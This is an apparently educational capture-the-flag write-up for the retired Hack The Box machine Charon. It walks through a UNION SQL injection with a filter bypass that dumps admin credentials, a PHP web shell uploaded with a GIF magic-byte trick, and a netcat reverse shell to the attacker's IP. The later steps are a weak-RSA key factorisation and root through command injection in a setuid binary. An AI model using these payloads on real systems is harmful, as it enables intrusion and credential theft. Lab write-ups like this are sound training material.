# Charon

This is the write-up for the box Charon that got retired at the 4th November 2017.
My IP address was 10.10.14.9 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.31    charon.htb
```

## Enumeration

Starting with a Nmap scan:

```markdown
nmap -sC -sV -o nmap/charon.nmap 10.10.10.31
```

```markdown
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 09:c7:fb:a2:4b:53:1a:7a:f3:30:5e:b8:6e:ec:83:ee (RSA)
|   256 97:e0:ba:96:17:d4:a1:bb:32:24:f4:e5:15:b4:8a:ec (ECDSA)
|_  256 e8:9e:0b:1c:e7:2d:b6:c9:68:46:7c:b3:32:ea:e9:ef (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Frozen Yogurt Shop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Checking HTTP (Port 80)

On the web page there is a blog about yogurt that is _"Powered by SuperCMS"_ and has many links to a _Free Website Templates page_ which is out-of-scope.
All the links and the software "SuperCMS" is distraction and lead to nothing.

Lets look for hidden directories with **Gobuster**:
```markdown
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.31
```

Besides default directories it also finds the directory _/cmsdata_ which is not usual but when going there, it responds with the HTTP error code _403 Forbidden_.
We need to enumerate this path more until it finds an accessible directory or file:
```markdown
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.31/cmsdata -x php
```

This finds the following PHP pages and directories.
- login.php (HTTP code _200 OK_)
- menu.php (HTTP code _301 Moved Permanently_)
- upload.php (HTTP code _301 Moved Permanently_)
- forgot.php (HTTP code _200 OK_)

The page _login.php_ is a "Login to SuperCMS" and the pages _menu.php_ and _upload.php_ redirect to _/login.php?err=2_.
On the page _forgot.php_ it asks for an email to retrieve the password:

![Retrieve password](https://kyuu-ji.github.io/htb-write-up/charon/charon_web-1.png)

This is what we want to exploit.

### SQL Injection

When inputting anything into the field, it says _"Incorrect format"_ and when trying any email address with an @-sign it says _"User not found with that email"_.
Lets send it to **Burpsuite** to try out different characters for example a single quote:
```markdown
email=a@b.com'
```

With a single quote it says _"Error in Database"_ so it looks like it is vulnerable to **SQL Injection**.
We can try a **UNION SQL Injection** to control the output of the database:
```markdown
email=a@b.com' UNION SELECT 1-- -
```

This responds with a blank error, so we probably sent blacklisted characters. After some tries it seems that the word "UNION" is blacklisted, but only in uppercase. So sending it with a lowercase character, we get the correct error from before:
```markdown
# Test 1
email=a@b.com' UNIoN SELECT 1-- -

# Test 2
email=a@b.com' UNIoN SELECT 1,2-- -

# Test 3
email=a@b.com' UNIoN SELECT 1,2,3-- -

# Test 4
email=a@b.com' UNIoN SELECT 1,2,3,4-- -
```

On the fourth test the web page responded with _"Incorrect Format"_ instead of the other error, so something happened and lets change the format of our input:
```markdown
# Test 1
email=a@b.com' UNIoN SELECT "a@b.com",2,3,4-- -

# Test 2
email=a@b.com' UNIoN SELECT 1,"a@b.com",3,4-- -

# Test 3
email=a@b.com' UNIoN SELECT 1,2,"a@b.com",4-- -

# Test 4
email=a@b.com' UNIoN SELECT 1,2,3,"a@b.com"-- -
```

On the fourth test the web page responded with _"Email sent to: a@b.com=>2"_ so this works and the next step is to get information out of the _INFORMATION_SCHEMA_ database with the `CONCAT` command.
```markdown
email=a@b.com' UNIoN SELECT 1,2,3,CONCAT(TABLE_SCHEMA, ":", TABLE_NAME, ":", COLUMN_NAME, "a@b.com") FROM INFORMATIoN_SCHEMA.COLUMNS WHERE TABLE_SCHEMA != 'Information_Schema' LIMIT 1-- -
```

This outputs the first column of the table:
```markdown
Email sent to: supercms:groups:grpida@b.com=>2
```

Getting the column names with the `OFFSET` command:
```markdown
email=a@b.com' UNIoN SELECT 1,2,3,CONCAT(TABLE_SCHEMA, ":", TABLE_NAME, ":", COLUMN_NAME, "a@b.com") FROM INFORMATIoN_SCHEMA.COLUMNS WHERE TABLE_SCHEMA != 'Information_Schema' LIMIT 1 OFFSET 1-- -

# Output
Email sent to: supercms:groups:userida@b.com=>2

(...) OFFSET 2

#Output:
Email sent to: supercms:liense:ida@b.com=>2

(...) OFFSET 3
#Output:
Email sent to: supercms:liense:license_keya@b.com=>2

(...)
```

As there can be a lot of rows, it is good to automate this process.
```bash
for i in $(seq 0 100); do
    payload="email=a@b.com' UNIoN SELECT 1,2,3,CONCAT(TABLE_SCHEMA, ':', TABLE_NAME, ':', COLUMN_NAME, 'a@b.com') FROM INFORMATIoN_SCHEMA.COLUMNS WHERE TABLE_SCHEMA != 'Information_Schema' LIMIT 1 OFFSET $i-- -"
    curl -s -d "$payload" http://10.10.10.31/cmsdata/forgot.php | grep -o '[^ ]\*@b.com'
done
```

Output:
```markdown
supercms:groups:grpida@b.com
supercms:groups:userida@b.com
supercms:license:ida@b.com
supercms:license:license_keya@b.com
supercms:operators:ida@b.com
supercms:operators:\__username_a@b.com
supercms:operators:\__password_a@b.com
supercms:operators:emaila@b.com
```

The tables **operators** got columns called _username_ and _password_ so we can use the UNION SQL Injection to output the contents of that:
```markdown
email=a@b.com' UNIoN SELECT 1,2,3,CONCAT(\__username_, ":", \__password_, "a@b.com") FROM supercms.operators LIMIT 1 OFFSET 1-- -

# Output
Email sent to: test1:5f4dcc3b5aa765d61d8327deb882cf99a@b.com=>2

(...) OFFSET 2

#Output:
Email sent to: test2:5f4dcc3b5aa765d61d8327deb882cf99a@b.com=>2
```

We can again use the bash script from before with the new payload but unfortunately it just enumerates users called _test1_ until _test100_ with the same MD5 hash for the word "password".
After increasing the number of the offset to 300 there is another user at row 201.

Username: super_cms_adm
Password hash: 0b0689ba94f94533400f4decd87fa260

The hash is a MD5 hash because it has 32 characters so looking it up on **Hashes.org** and the clear-text password is:
> tamarro

With these credentials it is possible to log into the website on the _/cmsdata/login.php_ page.

![SuperCMS admin page](https://kyuu-ji.github.io/htb-write-up/charon/charon_web-2.png)

### Getting command execution

On this page it is possible to upload image files so we can create a PHP shell with the magic byte for GIFs at the beginning to bypass that.
```markdown
GIF8
<?php echo system($\_REQUEST['cmd']); ?>
```

Before uploading, there has to be something changed in the HTML page source:

![HTML source code](https://kyuu-ji.github.io/htb-write-up/charon/charon_web-3.png)

The comment with the Base64 string has to be uncommented and instead of the Base64 string it has to be the decoded string.
```markdown
echo -n dGVzdGZpbGUx | base64 -d

# Output
testfile1
```

Changing the response can be accomplished with **Burpsuite** by intercepting server responses and modifying the HTML like so:
```html
<form action="upload.php" method="POST" onsubmit="javascript:return ValidateImage(this);" name="frm" enctype="multipart/form-data">
<input type="file" name="image" />
<input name="testfile1">
<input type="submit"/>
</form>
```

After forwarding the changes to the server we can input another parameter.
Now the file extension has to be gif, jpg or png so uploading works and it can be found in _/images/test.php_.

![Uploading file](https://kyuu-ji.github.io/htb-write-up/charon/charon_web-4.png)

On there we got command execution:
```markdown
http://10.10.10.31/images/test.php?cmd=whoami
```

This outputs that we are _www-data_ and confirms that command execution works so we can start a reverse shell session:
```markdown
http://10.10.10.31/images/test.php?cmd=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.40.9+9001+>/tmp/f
```

The listener on my IP and port 9001 starts a reverse shell connection on the box.

## Privilege Escalation

In the home directory of the user _decoder_ are files that we will download to find a way to escalate privileges to that user.
The files are:
- decoder.pub
  - Public key
- pass.crypt
  - Encrypted content

The task is to decrypt the _pass.crypt_ file.

### Manual RSA decryption

As this is a public key it is decrypted with **RSA** and this can be decrypted with math.

```python
from Crypto.PublicKey import RSA

f = open("decoder.pub","r")
key = RSA.importKey(f.read())
print key.n
print key.e
```

```markdown
- n = 85161183100445121230463008656121855194098040675901982832345153586114585729131
- e = 65537
```

We need to find the two factors (prime numbers) that equal to _n_. I used this [Online Factorization Calculator](https://www.alpertron.com.ar/ECM.HTM).
These numbers get called _p_ and _q_:
```markdown
- p = 280651103481631199181053614640888768819
- q = 303441468941236417171803802700358403049
```

We need one more number that gets called _m_:
```markdown
- m = n-(p+q-1)
```

With these numbers, it is possible to write a script to generate the private key. This script can found in this repository and is called **charon_rsa.py**.
After executing it, it outputs the private key.

Copying the contents into a file _decoder.priv_ and decrypting the _pass.crypt_ with it:
```markdown
openssl rsautl -decrypt -inkey decoder.priv < pass.crypt
```

Now we have the password of the user _decoder_:
> nevermindthebollocks

#### Easy way: RSA decryption with tools

This whole process can also be done with the tool [RsaCtfTool](https://github.com/Ganapati/RsaCtfTool):
```markdown
RsaCtfTool.py --publickey decoder.pub --uncipherfile pass.crypt
```

This decrypts the file immediately.

### Privilege Escalation to root

Now we are the user _decoder_ on the box and need to enumerate it with any **Linux Enumeration script**.
After analyzing, there is the non-default executable _/usr/local/bin/supershell_ that has the _setuid_ bit set.

This executable wants a command as a parameter but does nothing.
Lets download it to our local client and analyze it with **Radare2**.

![Analyzing binary with Radare2](https://kyuu-ji.github.io/htb-write-up/charon/charon_binary-1.png)

It loads _/bin/ls_ and a compares it to the parameters given with a `strcmp` function. If the comparison is true, it will execute a `printf` and `setuid` function and send it to `system`.

So if we execute it with _/bin/ls_ it displays the files in the current directory:
```markdown
/usr/local/bin/supershell /bin/ls
```

As it can only have one argument, we can put the `ls` command and another directory into quotes and display the contents of other directories:
```markdown
/usr/local/bin/supershell "/bin/ls /root"
```

This way we can execute other commands like this:
```markdown
/usr/local/bin/supershell "/bin/ls /\$(whoami)"
```

So we can write a program in C that spawns a shell, set the _setuid bit_ on it and execute it as root.

Shell script:
```c
#include <unistd.h>
#include <errno.h>

main( int argc, char ** argv, char ** envp )
{
        setuid(0);
        setgid(0);
        envp = 0;
        system ("/bin/bash", argv, envp);
return;
}
```

Compiling:
```markdown
gcc shell.c -o shell
```

Give ownership to root and set the _setuid bit_ with the supershell:
```markdown
/usr/local/bin/supershell "/bin/ls /$(chown root:root /tmp/shell)"

/usr/local/bin/supershell "/bin/ls /$(chmod 4755 /tmp/shell)"
```

Now we can execute _./shell_ and it will start as root!
